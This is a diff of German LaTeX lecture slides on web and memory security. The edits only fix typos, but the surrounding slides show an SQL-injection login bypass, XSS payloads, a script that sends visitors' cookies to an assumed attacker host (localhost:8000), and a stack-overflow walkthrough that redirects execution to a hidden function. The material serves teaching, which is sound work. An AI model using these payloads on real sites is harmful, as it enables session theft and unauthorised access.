@@ -276,7 +276,7 @@
     \item Daten in SQL Tabellen ver\"andern
     \item Installieren von Malware durch Server-Scripting Code zB. PHP
     \item Root Privilegien bekommen, durch Shell Injection oder Windows Service
-    \item Angtiff auf Web User durch Cross-Site-Scripting in HTML/JS
+    \item Angriff auf Web User durch Cross-Site-Scripting in HTML/JS
   \end{itemize}
 \end{frame}
 
@@ -319,15 +319,15 @@
 \end{frame}
 
 \begin{frame}[fragile]{SQL Injection - Beispiel}
-  Um die eingegebenen Daten zu \"uberpr\"ufen, fragt вas Site-Skript die Datenbank ab, ob das angegebene User/Passwort-Paar existiert:
+  Um die eingegebenen Daten zu \"uberpr\"ufen, fragt das Site-Skript die Datenbank ab, ob das angegebene User/Passwort-Paar existiert:
   \newline
   \begin{lstlisting}[style=SQLStyle]
     SELECT id, name FROM users
       WHERE name='$login' AND passwd='$passwd'
   \end{lstlisting}
-  Wo \$login und \$passwd sind Werte aus dem Form.
+  Wo \$login und \$passwd sind Werte aus dem Formular.
   \newline
-  Dann \"uberpr\"uft den Script ob die Abfrage hat das not-null Ergebnis zur\"uckgegeben:
+  Dann \"uberpr\"uft den Script ob die Abfragen ein not-null Ergebnis zur\"uckgegeben:
   \newline
   \begin{lstlisting}[style=PHPStyle]
     $result->num_rows > 0
@@ -335,20 +335,19 @@
 \end{frame}
 
 \begin{frame}[fragile]{SQL Injection - Beispiel}
-  Um das SQL Injection zu ausnutzen, geben wir in der Name-field {\fboxsep=0pt\colorbox{mGreen!50}{\strut ' OR 0=0 -- }} ein.
-  Den Password kann beliebig sein.
+  Um das SQL Injection auszunutzen, geben wir in das Name-field {\fboxsep=0pt\colorbox{mGreen!50}{\strut ' OR 0=0 -- }} ein, das Password kann beliebig sein.
   \newline
-  Dann wird die Abfragequery im Skript so aussehen:
+  Dann wird die Abfrage-Query im Skript so aussehen:
   \newline
   \begin{lstlisting}[style=SQLStyle]
     SELECT id, name FROM users
       WHERE name='' OR 0=0 -- ' AND passwd=''
   \end{lstlisting}
   \begin{itemize}
-    \item Alles was nach {\fboxsep=0pt\colorbox{mGreen!50}{\strut -- }} steht, wird als einen Kommentar interpretiert.
+    \item Alles was nach {\fboxsep=0pt\colorbox{mGreen!50}{\strut -- }} steht, wird als Kommentar interpretiert.
     \item Weil 0=0 immer true ist, werden alle Datenbankeintr\"age zur\"uckgegeben.
     \item $num\_rows>0$ wird true liefern.
-    \item Der Zugriff auf die Website wird erlaubt werden.
+    \item Der Zugriff auf die Website wird erlaubt.
   \end{itemize}
 
 \end{frame}
@@ -361,7 +360,7 @@
 
 \begin{frame}[fragile]{Cross Site Scripting - XSS}
   Bei Cross-Site Scripting (XSS) werden Sicherheitsl\"ucken in Webanwendungen ausgenutzt um schadhaften Code in sonst vertrauensw\"urdigen Websiten einzubinden.
-  Das ist der Fall wenn es nicht Vertrauensw\"urdigen Dritten erlaubt ist, Daten und Code hochzuladen.
+  Das ist der Fall wenn es Nicht-Vertrauensw\"urdigen Dritten erlaubt ist, Daten und Code hochzuladen.
   \newline
   Ziele:
   \begin{itemize}
@@ -384,8 +383,8 @@
     <p>Sie suchten nach: <script type=
           "text/javascript">alert("XSS")</script></p>
   \end{lstlisting}
-  Ausgenutzt wird das dynamisch generierte Websiten ihren Ihnalt an \"ubergebene Eingabewerte anpassen, durch HTTP-GET und HTTP-POST.
-  Dieser Typ heisst auch nicht-persistent, da der Schadcode nur tempr\"ar bei der jeweiligen Generierung der Website eingeschleust wird.
+  Ausgenutzt wird, dass dynamisch generierte Websiten ihren Ihnalt an \"ubergebene Eingabewerte anpassen, durch HTTP-GET und HTTP-POST.
+  Dieser Typ hei{\ss}t auch nicht-persistent, da der Schadcode nur tempor\"ar bei der jeweiligen Generierung der Website eingeschleust wird.
 \end{frame}
 
 \begin{frame}[fragile]{Cross Site Scripting - persistente Angriffe}
@@ -405,7 +404,7 @@
 
 \begin{frame}[fragile]{Cross Site Scripting - Schutzma{\ss}nahmen}
   \begin{itemize}
-    \item Anstatt Blacklist mit b\"osen Eingaben zu f\"uhren, besser Whitelist mit buten Eingaben. Da die Anzahl der Angriffmethoden nicht bekannt ist.
+    \item Anstatt Blacklist mit b\"osen Eingaben zu f\"uhren, besser Whitelist mit guten Eingaben. Da die Anzahl der Angriffsmethoden nicht bekannt ist.
     \item HTML-Metazeichen durch Zeichenreferenzen ersetzen, damit sie als normale Zeichen behandelt werden
     \item Sicher programmierte Anwendung sind Web Apllication Firewalls (WAF) vorzuziehen.
   \end{itemize}
@@ -413,8 +412,8 @@
 
 \begin{frame}[fragile]{XSS - Beispiel}
   \begin{itemize}
-    \item Wir betrachten ein Beispiel, wie man ein User-session mit Hilfe des XSS ergreifen kann.
-    \item Wir haben ein ganz einfacher Chat-interface und koennen mit Hilfe SQL-Injection als Admin einloggen.
+    \item Wir betrachten ein Beispiel, wie man eine User-Session mit Hilfe von XSS ergreifen kann.
+    \item Wir haben ein ganz einfaches Chat-interface und koennen uns mit Hilfe von SQL-Injection als Admin einloggen.
     \item Ziel: Diebstahl der Benutzersession, so dass es m\"oglich w\"are, in seinem Namen in den Chat zu schreiben
   \end{itemize}
 \end{frame}
@@ -431,7 +430,7 @@
 
 \begin{frame}[fragile]{XSS - Beispiel}
   \begin{itemize}
-    \item Wir verwenden die XSS-Sicherheitsl\"uck in Form, um unser eigenes Script in die Seite zu integrieren.
+    \item Wir verwenden die XSS-Sicherheitsl\"ucke in Form, um unser eigenes Script in die Seite zu integrieren.
     \item F\"ullen wir das Feld 'new message' wie folgt:
 
     \begin{lstlisting}[style=PHPStyle]
@@ -441,7 +440,7 @@
         img.src = "http://localhost:8000/cat.jpg?"+document.cookie;
       </script>
     \end{lstlisting}
-    \item Annahme: das Zieladdress (http://localhost:8000) geh\"ort zum Angreifer.
+    \item Annahme: die Zieladdresse (http://localhost:8000) geh\"ort zum Angreifer.
   \end{itemize}
 \end{frame}
 
@@ -458,8 +457,8 @@
 \begin{frame}[fragile]{XSS - Beispiel}
   \begin{itemize}
     \item Da die Website die Eingabe nicht \"uberpr\"uft, gelangt unser Skript in den Chat.
-    \item Ab jetzt jeder Besucher des Seites wird sein Cookies-data zum Angreifer senden.
-    \item Der Angreifer sollte, bis der richtige Benutzer die Seite aufruft.
+    \item Ab jetzt sendet jeder Besucher der Seites seine Cookies zum Angreifer.
+    \item Der Angreifer dauert, bis der richtige Benutzer die Seite aufruft.
     \item Der Angreifer kann dann in seinem Browser Cookie-Werte ersetzen, so dass die Website ihn als Benutzer nimmt.
   \end{itemize}
 \end{frame}
@@ -637,7 +636,7 @@
     \item Compilierte und assemblierte Sprachen anf\"allig
     \item Anf\"allige Sprachen, z.B. C/C++
     \item Unsichere Libraries in C/C++
-    \item Unsicheres Behandeln von Stirngs und Arraygr\"o{\ss}en
+    \item Unsicheres Behandeln von Strings und Arraygr\"o{\ss}en
   \end{itemize}
 
   Schutzma{\ss}nahmen:
@@ -737,11 +736,11 @@
     }
 
   \end{lstlisting}
-  Unsere Ziel ist die Funktion secretFunction() aufrufen onhe directe Befehl dazu
+  Unsere Ziel ist die Funktion secretFunction() aufrufen onhe direkten Befehl dazu
 \end{frame}
 
 \begin{frame}[fragile]{Stack Overflow - Beispiel}
-  Mit Hilfe des Programs objdump, schauen wir Assemble-code von unsere Program.
+  Mit Hilfe des Programs objdump, schauen wir den Assemble-code von unserem Program.
 
   \begin{lstlisting}[style=C2Style]
     objdump -d vuln
@@ -758,7 +757,7 @@
     \begin{lstlisting}[style=C2Style]
       00000000004005d6 <secretFunction>:
     \end{lstlisting}
-    \item Die Adresse des Puffers beginnt 0x20 = 32 in Dezimal-Bytes vor \%ebp. Dies bedeutet, dass 32 Bytes für den Puffer reserviert sind, obwohl wir nach 20 Bytes gefragt haben.
+    \item Die Adresse des Puffers beginnt 0x20 = 32 in Dezimal-Bytes vor \%ebp. Dies bedeutet, dass 32 Bytes f\"ur den Puffer reserviert sind, obwohl wir nur nach 20 Bytes gefragt haben.
     \begin{lstlisting}[style=C2Style]
       4005f5: 48 83 ec 20 sub $0x20,%rsp
     \end{lstlisting}
@@ -767,7 +766,7 @@
 \end{frame}
 
 \begin{frame}[fragile]{Stack Overflow - Beispiel}
-  Jetzt wissen wir, dass 32 Bytes für den Puffer reserviert sind, es ist direkt neben \%ebp. Daher speichern die nächsten 4 Bytes den \%ebp und die nächsten 4 Bytes speichern die Rückkehradresse (die Adresse, zu der \%eip nach Abschluss der Funktion springen wird). Die ersten 28 + 4 = 32 Bytes wären beliebige zufällige Zeichen und die nächsten 4 Bytes sind die Adresse der secretFunction.
+  Jetzt wissen wir, dass 32 Bytes f\"ur den Puffer reserviert sind, es ist direkt neben \%ebp. Daher speichern wir die n\"achsten 4 Bytes den \%ebp und die n\"achsten 4 Bytes speichern die R\"uckkehradresse (die Adresse, zu der \%eip nach Abschluss der Funktion springen wird). Die ersten 28 + 4 = 32 Bytes w\"aren beliebige zuf\"allige Zeichen und die n\"achsten 4 Bytes sind die Adresse der secretFunction.
 
   \begin{itemize}
     \item Wir erstellen ein Inputfile mit Sprungaddress
